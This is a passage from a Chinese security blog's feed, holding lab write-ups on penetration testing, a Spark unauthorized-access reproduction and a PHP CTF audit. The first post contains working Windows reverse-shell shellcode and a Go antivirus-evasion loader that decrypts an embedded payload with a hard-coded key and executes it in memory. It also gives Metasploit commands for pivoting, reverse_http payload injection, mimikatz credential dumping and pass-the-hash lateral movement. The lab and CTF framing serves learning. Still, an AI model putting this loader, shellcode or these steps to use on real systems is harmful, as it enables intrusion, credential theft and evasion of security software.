class="hljs-string">&quot;/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSA+3SkpIi3JQTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FBEi0AgSQHQi0gY41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACcOwKhPikFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V   &quot;</span><br><span class="hljs-comment">// 密钥长度16</span><br>key := []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;PuamRHUGPRzstnCJ&quot;</span>)<br>src := EncyptogAES([]<span class="hljs-type">byte</span>(str), key)<br>base64Str := base64.StdEncoding.EncodeToString(src)<br>fmt.Println(<span class="hljs-string">&quot;加密后的数据为:&quot;</span>, base64Str)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后将加密之后的值放入下面的脚本</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;crypto/aes&quot;</span><br><span class="hljs-string">&quot;crypto/cipher&quot;</span><br><span class="hljs-string">&quot;encoding/base64&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;syscall&quot;</span><br><span class="hljs-string">&quot;unsafe&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>kernel32      = syscall.NewLazyDLL(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)<br>VirtualAlloc  = kernel32.NewProc(<span class="hljs-string">&quot;VirtualAlloc&quot;</span>)<br>RtlMoveMemory = kernel32.NewProc(<span class="hljs-string">&quot;RtlMoveMemory&quot;</span>)<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">brun</span><span class="hljs-params">(ddm <span class="hljs-type">string</span>)</span></span> &#123;<br>sDec, _ := base64.StdEncoding.DecodeString(ddm)<br>addr, _, _ := VirtualAlloc.Call(<span class="hljs-number">0</span>, <span class="hljs-type">uintptr</span>(<span class="hljs-built_in">len</span>(sDec)), <span class="hljs-number">0x1000</span>|<span class="hljs-number">0x2000</span>, <span class="hljs-number">0x40</span>)<br>_, _, _ = RtlMoveMemory.Call(addr, (<span class="hljs-type">uintptr</span>)(unsafe.Pointer(&amp;sDec[<span class="hljs-number">0</span>])), <span class="hljs-type">uintptr</span>(<span class="hljs-built_in">len</span>(sDec)))<br>syscall.Syscall(addr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>&#125;<br><br><span class="hljs-comment">// 去掉字符（末尾）</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">UnPaddingText1</span><span class="hljs-params">(str []<span class="hljs-type">byte</span>)</span></span> []<span class="hljs-type">byte</span> &#123;<br>n := <span class="hljs-built_in">len</span>(str)<br>count := <span class="hljs-type">int</span>(str[n<span class="hljs-number">-1</span>])<br>newPaddingText := str[:n-count]<br><span class="hljs-keyword">return</span> newPaddingText<br>&#125;<br><br><span class="hljs-comment">// DES解密</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">DecrptogAES</span><span class="hljs-params">(src, key []<span class="hljs-type">byte</span>)</span></span> []<span class="hljs-type">byte</span> &#123;<br>block, err := aes.NewCipher(key)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>blockMode := cipher.NewCBCDecrypter(block, key)<br>blockMode.CryptBlocks(src, src)<br>src = UnPaddingText1(src)<br><span class="hljs-keyword">return</span> src<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 加密后的数据</span><br>str := <span class="hljs-string">&quot;oMtzMR5FbIOMCr8bt0aChEm20/IZjhgp3ELbwsrN75EjSEwisnTuDdr5xhad607G9CUY8oDEbvSeZ4abFEzQ0ZzwTTnqPcDaVhN44m1+1STQFL3SxFNfXn9JXgNTUTA3KoXCzznA5YfhgHBVmjMQncgUexzC+w4zDusjgPQu9qtw63rg9MD+JpWUnvYmFveZAoBPRP1OgfS7V6fJrJ0Z0vvhcnWTqyVwf5Em3Zz12FHZPBd7gYunBZf1T2R6sKcIfz0Dd+9ChKv86byq8T/YA7/qhhvnTmI6Kb/MyEXKf4D75KLrxB69LbnGYvb/xg1jAhckcbUCR7C7AtPRxcc70ZTMM+kax3Qy0ixB149wk/mHhROUAriLNgi8jqoGDZsSOB2uFay5ERCvoU3mAGZBTCZ0yyvzPZm0AO8zFcvudXFrXzNg0Vs7ozhs6qM3XvXIojhM1ebdUZwEU6UK8q/jlPId/wPT72eEoJwOA14v0Zhalvfi71X6DtQIyvSirU+gZtJYNjTUqPMoVriLLJQL73t2DTHeFY1R2DhtDN8cNL5qc0T0sW0uRB0WD8Kj83yl/HX3OXJlS2Xtrr9wryikQCoetRBn9HnGVYD1n29QoWTM4RII7qhNTcRqKTwu1+FZ608K8WTg9QsNCoCCYj7B8WoiZbZTPUuP93SxK77A7F2NFnVZVpN1WUH5PIfvw6An2cRTCGvczEUa9N/nmPox04YzYMKnTK1/vF3nCaVoiM5X02QfIUbzVS6iSr745FDrTrVlN48wJJWeWX5ZSYSDOh7g6RiHqOAGjOL0GIcHKRwF1cHOIjH4cMvxpMKJXnkiYyyHKsPjZtt3dpx6X5inqZRRZzQY8hbeBd1XYO87I3W0B8l9XyJNAOMg6Z+i0UBlByhUX3AUko33rydD2ZdY+Q==&quot;</span><br><span class="hljs-comment">// 16位密钥</span><br>key := []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;PuamRHUGPRzstnCJ&quot;</span>)<br>base_byte, _ := base64.StdEncoding.DecodeString(str)<br>brun(<span class="hljs-type">string</span>(DecrptogAES(base_byte, key)))<br>&#125;<br><br></code></pre></td></tr></table></figure><p>经尝试，免杀使用冰蝎执行的时候会被杀，但是是点击执行就不会</p><p>开启msf代理，这里先尝试使用stowaway，果然还是不行，只要是使用虚拟终端执行的，貌似都会被查杀</p><p>尝试免杀的代理软件都会直接被查杀</p><p>那就直接使用msf的代理，也就卡了亿点</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">meterpreter</span> &gt; run autoroute -s <span class="hljs-number">10.10.10.1</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">msf6 exploit(windows/<span class="hljs-keyword">local</span>/payload_inject) &gt; <span class="hljs-keyword">search</span> socks<br>msf6 exploit(windows/<span class="hljs-keyword">local</span>/payload_inject) &gt; use <span class="hljs-number">0</span><br>msf6 auxiliary(<span class="hljs-keyword">server</span>/socks_proxy) &gt; <span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br>run<br></code></pre></td></tr></table></figure><h2 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h2><p>可以尝试冰蝎传给cs（后面发现连接失败）</p><p>一开始连接weblogic就炸（黑人）</p><p>我使用msf传给cs，熟练一下操作</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/local/payload_inject<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http<br><span class="hljs-built_in">set</span> DisablePayloadHandler <span class="hljs-literal">true</span><br><span class="hljs-built_in">set</span> lhost<span class="hljs-built_in"> IP</span><br><span class="hljs-built_in"></span><span class="hljs-built_in">set</span> lport<span class="hljs-built_in"> PORT</span><br><span class="hljs-built_in"></span><span class="hljs-built_in">set</span> session <br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130150426106.png" alt="image-20240130150426106"></p><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><ol><li><p>查看Web所在的网段</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240128181132606.png" alt="image-20240128181132606"></p></li><li><p>扫描一下存活的主机情况</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130152055163.png" alt="image-20240130152055163"></p></li><li><p>提取密码+提权</p><ul><li><p>msf</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean">getuid     # 获取当前身份<br>hashdump   # 获取hash<br>getsystem  # 获取<span class="hljs-keyword">system</span><br>load kiwi  # 加载mimikatz<br>creds_all  # 获取明文密码<br>lsa_dump_sam  # 获取sam数据库<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130153829548.png" alt="image-20240130153829548"></p></li><li><p>cs</p><p>看大佬的wp好像提权不了但是我直接提权成功了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130153841783.png" alt="image-20240130153841783"></p></li></ul></li><li><p>收集每一个主机的端口信息</p><p>已经控制的Web ip 10.10.10.134</p><ul><li>10.10.10.10</li><li>10.10.10.201</li></ul></li><li><p>由于前面的信息收集发现存在3389尝试利用(想换一个代理)</p><p>由于msf代理扫描端口太慢了，所以尝试能不能使用其他用户直接执行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130154956456.png" alt="image-20240130154956456"></p><p>不敢改</p><p>尝试使用域用户登录</p><p>基本都是已过期，或者未授权</p><p>在有杀软的情况下不能创建新用户</p></li><li><p>用户收集</p><p>msf乱码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130155337852.png" alt="image-20240130155337852"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130155444628.png" alt="image-20240130155444628"></p></li><li><p>尝试创建新用户</p><p>在system权限之下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130155905475.png" alt="image-20240130155905475"><br>上帝视角看是被阻拦了</p></li><li><p>杀软信息收集</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tasklist <span class="hljs-string">/SVC</span><br></code></pre></td></tr></table></figure><p><a href="https://www.ddosi.org/av/1.php">Windows杀软在线查询 (ddosi.org)</a></p><p><img src="D:\hexo\source_posts\靶场记录\RedSun02.assets\image-20240130160113001.png" alt="image-20240130160113001"></p></li><li><p>补丁</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130173445591.png" alt="image-20240130173445591"></p></li></ol><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>要出现这个必须使用cs的端口扫描才行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130170119738.png" alt="image-20240130170119738"></p><p>计划是先针对双网卡的，先尝试利用还有一个有外网ip的主机</p><h2 id="10-10-10-10"><a href="#10-10-10-10" class="headerlink" title="10.10.10.10"></a>10.10.10.10</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130172850975.png" alt="image-20240130172850975"></p><h3 id="445"><a href="#445" class="headerlink" title="445"></a>445</h3><p>著名的永恒之蓝</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130173747037.png" alt="image-20240130173747037"></p><p>尝试都失败了</p><h3 id="3389"><a href="#3389" class="headerlink" title="3389"></a>3389</h3><p>还是和上面的一样</p><h3 id="hash传递"><a href="#hash传递" class="headerlink" title="hash传递"></a>hash传递</h3><p>添加一个smb隧道</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130201814784.png" alt="image-20240130201814784"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130201859575.png" alt="image-20240130201859575"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130201743638.png" alt="image-20240130201743638"></p><h2 id="10-10-10-201"><a href="#10-10-10-201" class="headerlink" title="10.10.10.201"></a>10.10.10.201</h2><h3 id="hash传递-1"><a href="#hash传递-1" class="headerlink" title="hash传递"></a>hash传递</h3><p>同上</p><p>只不过得换一个模式</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130203514585.png" alt="image-20240130203514585"></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶场记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spark未授权访问</title>
    <link href="/2024/01/25/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <url>/2024/01/25/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>apache顶级项目，大规模数据处理计算引擎。为了方便的给使用者控制系统进行计算和查看任务结果，提供了WebUI图形化界面和相应的REST API方便用户操作。支持用户向管理节点提交应用，并分发给集群使用，如果管理节点未启用ACL（访问控制），我们便可在集群中执行任意代码。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>进入vulhub-master&#x2F;spark&#x2F;unacc </p><p>使用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240126000543877.png" alt="image-20240126000543877"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240126000721812.png" alt="image-20240126000721812"></p><p>发现版本是2.3.1</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240201174429203.png" alt="image-20240201174429203"></p><p>发现可能存在漏洞</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>使用msf</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">search</span> spark<br><span class="hljs-keyword">use</span> 0<br><span class="hljs-keyword">set</span> rhosts 192.168.79.128<br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20240201175140752.png" alt="image-20240201175140752"></p><p>成功拿下</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计</title>
    <link href="/2024/01/25/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/01/25/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="GDOUCTF-2023-受不了一点"><a href="#GDOUCTF-2023-受不了一点" class="headerlink" title="[GDOUCTF 2023]受不了一点"></a>[GDOUCTF 2023]受不了一点</h1><p>0x00</p><p>这个就是代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>] == <span class="hljs-string">&#x27;j0k3r&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bbb&#x27;</span>])) &#123;<br>                    <span class="hljs-variable">$aaa</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>];<br>                    <span class="hljs-variable">$bbb</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bbb&#x27;</span>];<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$aaa</span> == <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-variable">$bbb</span> == <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-variable">$aaa</span> != <span class="hljs-variable">$bbb</span>) &#123;<br>                        <span class="hljs-variable">$give</span> = <span class="hljs-string">&#x27;cancanwordflag&#x27;</span>;<br>                        <span class="hljs-variable">$get</span> = <span class="hljs-string">&#x27;hacker!&#x27;</span>;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>])) &#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-variable">$give</span>);<br>                        &#125;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span> || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-variable">$get</span>);<br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                            <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                            <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$$value</span>;<br>                        &#125;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;洗洗睡吧&quot;</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;行不行啊细狗&quot;</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;菜菜&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;就这?&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;别来沾边&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184501023.png" alt="image-20240125184501023"></p><p>这个地方只需要进行数组绕过就可以了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184614075.png" alt="image-20240125184614075"></p><p>设置cookie</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184636644.png" alt="image-20240125184636644"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184707258.png" alt="image-20240125184707258"></p><p>两个等号这个是弱比较</p><p><a href="https://blog.csdn.net/qq_47804678/article/details/128814377">php比较绕过（强比较“&#x3D;&#x3D;&#x3D;”&#x2F;弱比较“&#x3D;&#x3D;“）-CSDN博客</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125184819978.png" alt="image-20240125184819978"></p><p>这个地方只需要设置一个flag，而且这个部分并没有对其他的参数进行过滤，我们只需要将其他参数设置成flag然后Falg使用这个参数就可以了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240125185033074.png" alt="image-20240125185033074"></p><h1 id="鹤城杯-2021-Middle-magic"><a href="#鹤城杯-2021-Middle-magic" class="headerlink" title="[鹤城杯 2021]Middle magic"></a>[鹤城杯 2021]Middle magic</h1><p>0x00</p><p>运用的知识点</p><ol><li>换行符的url编码为 <code>%0a</code>   空格的编码为 <code>%20</code></li><li>正则匹配</li></ol><p>0x01</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 